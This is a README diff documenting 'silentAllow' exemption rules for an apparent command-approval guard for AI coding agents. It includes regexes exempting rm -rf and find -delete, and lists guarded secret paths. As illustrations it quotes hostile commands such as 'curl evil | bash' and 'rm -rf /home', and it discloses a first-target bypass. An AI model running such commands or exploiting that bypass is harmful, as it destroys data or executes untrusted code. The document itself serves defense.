@@ -144,6 +144,26 @@ strictModeWhiteList:
 
 When strict mode prompts for a command you trust (e.g. `npm test`), select 📋 **Whitelist** to save it permanently. The pattern is written to `.pi/defender.yaml` under `strictModeWhiteList` — future runs auto-approve.
 
+### Silent allow (safe-context exemptions)
+
+The `strictModeWhiteList` only skips **strict mode** prompts — in patterns mode, any command matching a `bashToolPattern` still prompts. To narrow a broad security pattern to the contexts you consider safe, add a `silentAllow` entry: commands matching it skip pattern, read-only, and no-delete prompts — the prompts that fire in patterns mode. In strict mode the per-command approval gate still applies unless the command is also in `strictModeWhiteList`.
+
+```yaml
+# rm -rf on /tmp and standard rebuildable dirs runs without prompting
+silentAllow:
+  - '^\brm\s+-[a-zA-Z]*[rRfF][a-zA-Z]*(?:\s+--)?\s+(?:\./)?(?:/tmp|dist|build|out|coverage|\.next|node_modules|target|\.cache|\.turbo|\.vite)(?:/|\s|$)'
+  # find -delete confined to /tmp
+  - '^\bfind\s+/tmp\b.*\s+-delete\b'
+```
+
+Three hard guards keep exemptions from becoming escape hatches:
+
+1. **Zero-access paths are checked first** — `silentAllow` can never exempt reads/writes of secrets (`~/.ssh/`, `*.key`, `*.pem`, …), even with a blanket entry like `.*`.
+2. **Privilege escalation is never silent** — any command containing `sudo`, `su -`, or a pipe-to-shell (`| bash`, `| sh`) skips `silentAllow` entirely, so a `/tmp` entry cannot exempt `curl evil | bash > /tmp/out`.
+3. **Chains are still checked per sub-command** — `rm -rf /tmp && rm -rf /home` still prompts on the `/home` part.
+
+Keep entries verb-scoped (as above). Note the first-target caveat: `rm -rf dist /home/x` is exempted because only the first target is inspected.
+
 ## Quick Commands to Try
 
 After install, test protection in a Pi session:
